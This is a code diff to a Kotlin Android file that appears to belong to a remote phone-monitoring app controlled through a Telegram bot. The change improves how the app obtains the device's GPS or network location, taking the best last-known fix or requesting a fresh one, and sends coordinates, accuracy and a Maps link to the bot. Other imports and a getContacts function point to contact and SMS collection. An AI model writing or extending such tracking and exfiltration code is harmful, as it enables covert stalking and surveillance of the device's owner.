@@ -3,17 +3,23 @@ package com.dec.monitor.system
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
+import android.location.Location
+import android.location.LocationListener
 import android.location.LocationManager
 import android.media.AudioManager
 import android.media.RingtoneManager
 import android.os.BatteryManager
-import android.provider.ContactsContract
+import android.os.Bundle
 import android.telephony.SmsManager
 import com.dec.monitor.TelegramBot
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.suspendCancellableCoroutine
 import kotlinx.coroutines.withContext
+import kotlinx.coroutines.withTimeoutOrNull
 import java.io.File
 import java.io.FileWriter
+import android.provider.ContactsContract
+import kotlin.coroutines.resume
 
 object DeviceInfo {
 
@@ -35,36 +41,89 @@ object DeviceInfo {
         return "$pct% — ${if (charging) "Charging ($plugType)" else "Not charging"}"
     }
 
-    suspend fun getLocation(context: Context) = withContext(Dispatchers.IO) {
+    suspend fun getLocation(context: Context) = withContext(Dispatchers.Main) {
         try {
             val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
-            val providers = lm.getProviders(true)
-            var bestLat = 0.0
-            var bestLon = 0.0
-            var found = false
 
-            for (provider in providers) {
+            val enabledProviders = lm.getProviders(true)
+            if (enabledProviders.isEmpty()) {
+                TelegramBot.sendMessage("📍 Location is OFF on device — please enable GPS")
+                return@withContext
+            }
+
+            // try last known first across all providers
+            var best: Location? = null
+            for (provider in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER)) {
                 try {
                     @Suppress("MissingPermission")
                     val loc = lm.getLastKnownLocation(provider)
                     if (loc != null) {
-                        bestLat = loc.latitude
-                        bestLon = loc.longitude
-                        found = true
-                        break
+                        if (best == null || loc.accuracy < best.accuracy) {
+                            best = loc
+                        }
                     }
                 } catch (e: Exception) { continue }
             }
 
-            if (found) {
-                val mapsUrl = "https://maps.google.com/?q=$bestLat,$bestLon"
-                TelegramBot.sendMessage("📍 <b>Location</b>\nLat: $bestLat\nLon: $bestLon\n<a href=\"$mapsUrl\">Open in Maps</a>")
-            } else {
-                TelegramBot.sendMessage("📍 Location unavailable — GPS may be off")
+            if (best != null) {
+                sendLocationMessage(best)
+                return@withContext
             }
+
+            // no last known — request fresh with timeout
+            TelegramBot.sendMessage("📍 Requesting fresh location...")
+
+            val freshLocation = withTimeoutOrNull(15000) {
+                suspendCancellableCoroutine { cont ->
+                    val listener = object : LocationListener {
+                        override fun onLocationChanged(loc: Location) {
+                            lm.removeUpdates(this)
+                            if (cont.isActive) cont.resume(loc)
+                        }
+                        @Deprecated("Deprecated in Java")
+                        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
+                        override fun onProviderEnabled(provider: String) {}
+                        override fun onProviderDisabled(provider: String) {}
+                    }
+
+                    cont.invokeOnCancellation { lm.removeUpdates(listener) }
+
+                    val provider = when {
+                        lm.isProviderEnabled(LocationManager.GPS_PROVIDER) -> LocationManager.GPS_PROVIDER
+                        lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER) -> LocationManager.NETWORK_PROVIDER
+                        else -> null
+                    }
+
+                    if (provider != null) {
+                        try {
+                            @Suppress("MissingPermission")
+                            lm.requestLocationUpdates(provider, 0L, 0f, listener)
+                        } catch (e: Exception) {
+                            if (cont.isActive) cont.resume(null)
+                        }
+                    } else {
+                        if (cont.isActive) cont.resume(null)
+                    }
+                }
+            }
+
+            if (freshLocation != null) {
+                sendLocationMessage(freshLocation)
+            } else {
+                TelegramBot.sendMessage("📍 Location timeout — GPS signal weak, try outdoors")
+            }
+
         } catch (e: Exception) {
             TelegramBot.sendMessage("📍 Location error: ${e.message}")
         }
+    }
+
+    private suspend fun sendLocationMessage(loc: Location) {
+        val mapsUrl = "https://maps.google.com/?q=${loc.latitude},${loc.longitude}"
+        val accuracy = "±${loc.accuracy.toInt()}m"
+        TelegramBot.sendMessage(
+            "📍 <b>Location</b>\nLat: ${loc.latitude}\nLon: ${loc.longitude}\nAccuracy: $accuracy\n<a href=\"$mapsUrl\">Open in Maps</a>"
+        )
     }
 
     suspend fun getContacts(context: Context) = withContext(Dispatchers.IO) {
